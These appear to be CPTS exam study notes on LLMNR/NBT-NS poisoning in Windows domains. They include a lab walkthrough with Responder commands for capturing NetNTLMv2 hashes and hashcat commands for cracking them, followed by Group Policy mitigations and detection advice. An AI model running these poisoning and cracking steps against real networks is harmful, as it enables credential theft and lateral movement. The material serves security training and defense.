# LLMNR / NBT-NS Poisoning in Windows Domain Environments

---

## 1. Background

- Many organizations rely on **Active Directory (AD)** for authentication.
- Misconfigurations expose systems to **legacy protocol abuse**:
  - LLMNR poisoning
  - NBT-NS poisoning
- These attacks enable:
  - Credential interception
  - Relay attacks

---

## 2. What Are LLMNR and NBT-NS?

- **LLMNR (Link-Local Multicast Name Resolution)**
- **NBT-NS (NetBIOS Name Service)**

➡ Used as fallback mechanisms when **DNS resolution fails**

---

## Windows Name Resolution Order

1. Check localhost  
2. Check hosts file  
   ```
   C:\Windows\System32\drivers\etc\hosts
   ```
3. Query DNS servers  
4. Send LLMNR multicast request  
5. Send NBT-NS broadcast request  

---

## Security Issue

- If DNS fails → system broadcasts request
- Any host can respond (no authentication)
- Attackers can:
  - Impersonate legitimate services
  - Capture credentials

---

## 3. Attack Overview

### Tool Used
- Responder

---

### Attack Workflow

1. User accesses non-existent resource (e.g., `\\share`)
2. System sends LLMNR/NBT-NS query
3. Attacker responds with fake IP
4. Victim attempts authentication
5. Attacker captures **NetNTLMv2 hash** or relays auth

---

### Example Command

```
responder -I eth0 -dwv
```

#### Flags:
- `-d` → DHCP poisoning  
- `-w` → WPAD rogue proxy  
- `-v` → Verbose  

---

## 4. Impact

### Credential Exposure
- Captures **NetNTLMv2 hashes**
- Can be cracked offline

---

### Man-in-the-Middle (MITM)
- Intercept authentication traffic

---

### SMB Relay Attacks
- Works if **SMB signing is NOT enforced**
- No need to crack hashes

#### Can lead to:
- Remote command execution
- Privilege escalation
- Lateral movement

---

## 5. Lab Setup and Exploitation

### Step 1: Install Responder

```
apt install responder
```

OR

```
git clone https://github.com/SpiderLabs/Responder.git
cd Responder
python3 Responder.py --help
```

---

### Step 2: Start Responder

```
responder -I eth0 -dwv
```

---

### Step 3: Trigger Name Resolution

From victim machine:

```
ping test.local -t
```

OR

```
\\test.local
```

➡ Forces fallback to LLMNR/NBT-NS

---

### Step 4: Capture NetNTLMv2 Hash

```
cat logs/SMB-NTLMv2-*.txt
```

Example:

```
username::domain:challenge:response:blob
```

---

### Step 5: Crack the Hash

Identify hash:

```
hashid <hash>
```

Crack with Hashcat:

```
hashcat -m 5600 hashes.txt /opt/rockyou.txt
```

Show cracked passwords:

```
hashcat -m 5600 hashes.txt /opt/rockyou.txt --show
```

---

## 6. Mitigation and Defense

### Disable LLMNR

```
Computer Configuration
→ Administrative Templates
→ Network
→ DNS Client
→ Turn off multicast name resolution = Enabled
```

---

### Disable NetBIOS over TCP/IP

- Network Adapter → IPv4 → Advanced → WINS  
- Select: **Disable NetBIOS over TCP/IP**

---

### Enforce SMB Signing

```
Computer Configuration
→ Windows Settings
→ Security Settings
→ Local Policies
→ Security Options
```

Enable:
- Microsoft network client: Digitally sign communications (always)
- Microsoft network server: Digitally sign communications (always)

---

### Strengthen Authentication

- Strong password policies  
- Account lockout policies  
- Multi-factor authentication  

---

### Network Hardening

- Segment networks  
- Restrict broadcast domains  
- Monitor authentication patterns  

---

### Detection & Monitoring

Tools:
- Wireshark  
- Zeek  
- Suricata  

Look for:
- Unexpected LLMNR/NBT-NS responses  
- Multiple responses to single query  
- Rogue WPAD activity  

---

## 7. Related Threats

### mDNS Poisoning

- Uses `.local` domains  
- Common in Windows/Linux/macOS  

#### Mitigation:
- Disable mDNS if unnecessary  
- Monitor multicast traffic  

---

## 8. Quick Defense Checklist

| Control                | Status        |
|----------------------|--------------|
| Disable LLMNR        | Recommended  |
| Disable NetBIOS      | Recommended  |
| Enforce SMB Signing  | Critical     |
| Strong Passwords     | Required     |
| Network Segmentation | Recommended  |
| Monitor Traffic      | Required     |
| Review mDNS Usage    | Recommended  |

---

## 🔥 Key Exam Points (CPTS)

- LLMNR/NBT-NS = **fallback protocols → no authentication**
- Core attack = **poison → capture NetNTLMv2**
- Responder = **primary tool**
- SMB relay works **without cracking hashes**
- Best defense:
  - Disable LLMNR + NetBIOS
  - Enforce SMB signing
